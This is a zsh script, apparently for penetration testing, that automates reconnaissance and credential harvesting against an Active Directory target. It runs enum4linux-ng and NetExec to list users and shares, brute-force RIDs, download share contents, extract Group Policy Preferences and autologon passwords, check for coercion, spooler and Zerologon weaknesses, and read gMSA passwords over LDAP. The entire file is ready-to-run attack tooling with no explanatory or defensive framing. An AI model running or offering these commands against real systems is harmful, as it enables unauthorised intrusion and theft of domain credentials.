#!/bin/zsh

target=$1

vared -p "Enter username or leave blank: " -c domainUser
vared -p "Enter password or leave blank: " -c domainPassword
echo "[*] Running enum4linux..."
enum4linux-ng -A $target -u "$domainUser" -p "$domainPassword" | tee enum4linux-$target-$domainUser.log
echo "[*] Running basic SMB enum..."
nxc smb $target -u "$domainUser" -p "$domainPassword" --users --shares --pass-pol --loggedon-users | tee smb_basic_enum_$domainUser.log
nxc smb $target -u "$domainUser" -p "$domainPassword" --rid-brute 8000 | grep SidTypeUser | awk '{print $6}' | cut -d '\' -f2 | grep -E '^[0-9A-Za-z\._\$]+$' --only-match | grep -v -i "administrator\|krbtgt\|guest" | tee rid-brute-$domainUser.log
nxc smb $target -u "$domainUser" -p "$domainPassword" --users | awk '{print $5}' | grep -E '^[0-9A-Za-z\._]+$' --only-match | grep -v -i "administrator\|krbtgt\|guest" | tee domain_users_$domainUser.txt
echo "[*] Spidering shares..."
nxc smb $target -u "$domainUser" -p "$domainPassword" -M spider_plus -o DOWNLOAD_FLAG=1 OUTPUT_FOLDER=`pwd` | tee -a smb_basic_enum_$domainUser.log
echo "[*] Checking for GPP passwords and autologon info..."
nxc smb $target -u "$domainUser" -p "$domainPassword" -M gpp_autologin | tee -a smb_basic_enum_$domainUser.log
nxc smb $target -u "$domainUser" -p "$domainPassword" -M gpp_password | tee -a smb_basic_enum_$domainUser.log
echo "[*] Enumerating Certificate authorities..."
nxc smb $target -u "$domainUser" -p "$domainPassword" -M enum_ca | tee -a smb_basic_enum_$domainUser.log
echo "[*] Checking if spooler service is running on the target..."
nxc smb $target -u "$domainUser" -p "$domainPassword" -M spooler | tee -a smb_basic_enum_$domainUser.log
echo "[*] Checking if the target is vulnerable to ceorcing attacks..."
nxc smb $target -u "$domainUser" -p "$domainPassword" -M coerce_plus | tee -a smb_basic_enum_$domainUser.log
echo "[*] Testing for Zerologon..."
nxc smb $target -u "$domainUser" -p "$domainPassword" -M zerologon | tee -a smb_basic_enum_$domainUser.log
echo "[*] Running basic LDAP enum..."
nxc ldap $target -u "$domainUser" -p "$domainPassword" --users --get-sid --trusted-for-delegation --gmsa | tee ldap_basic_enum_$domainUser.log
nxc ldap $target -u "$domainUser" -p "$domainPassword" --gmsa | tee -a ldap_basic_enum_$domainUser.log
